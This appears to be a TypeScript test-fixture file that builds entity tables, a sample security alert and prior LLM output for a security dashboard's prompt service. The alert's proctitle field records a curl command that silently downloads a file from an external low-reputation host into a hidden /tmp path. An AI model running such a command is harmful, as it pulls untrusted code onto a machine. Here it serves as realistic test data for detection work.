// Fixtures mirror the exact shapes the pages hand to PromptService. Shapes matter
// more than values here: a hand-written flat array would hide the array-of-arrays
// flattening that a template literal performs.

// Details.tsx holds entityDetails column-major: entityDetails[fieldIndex][rowIndex].
export const entityDetails: string[][] = [
  ['workstation-42', 'db-prod-03'],
  ['Host', 'Host'],
  ['10.4.2.17', '10.4.9.201'],
  ['181.7', '204.3'],
  ['272', '311'],
];

// Home.tsx / Summary.tsx build this from a Set of comma-joined rows, one array per
// entity, in the column order named by HIGH_LEVEL_FIELD_NAMES below.
export const highLevelDataList: string[][] = [
  ['workstation-42', 'Host', '10.4.2.17', '181.7', '272'],
  ['db-prod-03', 'Host', '10.4.9.201', '204.3', '311'],
  ['svc-backup', 'Account', '10.4.2.90', '96.2', '140'],
];

// Declared in Home.tsx:50 and Summary.tsx:63 and fed to the table headers. The
// pages intend to merge these into the prompt payload but the concat that would
// do it discards its result — see the "data contract" tests.
export const HIGH_LEVEL_FIELD_NAMES = ['Entity', 'Entity Type', 'Ip', 'Atomic Weight', 'Atomic Mass'];

export const alert = {
  guid: 'a1f3c9e2-77b4-4d21-9c30-6be0f1d84c55',
  entity: 'workstation-42',
  timestamp: '2026-08-14T02:41:09Z',
  category: 'Execution',
  mitre_tactic: 'TA0002',
  severity: 'High',
  username: 'svc-backup',
  host_ip: '10.4.2.17',
  source_ip: '10.4.2.17',
  dest_ip: '203.0.113.44',
  dest_port: '8443',
  dst_geo: 'RO',
  executable: '/usr/bin/curl',
  syscall_name: 'execve',
  process: 'curl',
  proctitle: 'curl -sk https://203.0.113.44:8443/x -o /tmp/.cache',
  message: 'Outbound transfer to low-reputation host',
};


export const question = 'Why is this entity scoring so high?';

// Prior LLM output — the only argument that is legitimately a plain string.
export const priorOutput =
  'Three hosts show elevated atomic weight. workstation-42 executed curl against a low-reputation endpoint.';

// Shape returned by RetrieveEntityDetailsNeo: a pandas frame serialised column-major,
// keyed by column then row index. Details.tsx holds the column names separately in
// entityFields and the values in entityDetails.
export const entityFieldNames = ['detection_type', 'severity', 'mitre_tactic', 'category', 'username'];
export const entityColumns = [
  { '0': 'CLOUD_ALERT', '1': 'K8_ALERT', '2': 'K8_ML' },
  { '0': '', '1': '', '2': '' },
  { '0': '', '1': '', '2': '' },
  { '0': 'AssumeRoleWithWebIdentity', '1': 'get', '2': 'linux' },
  { '0': 'svc-dataset-worker', '1': 'svc-dataset-worker', '2': 'svc-dataset-worker' },
];
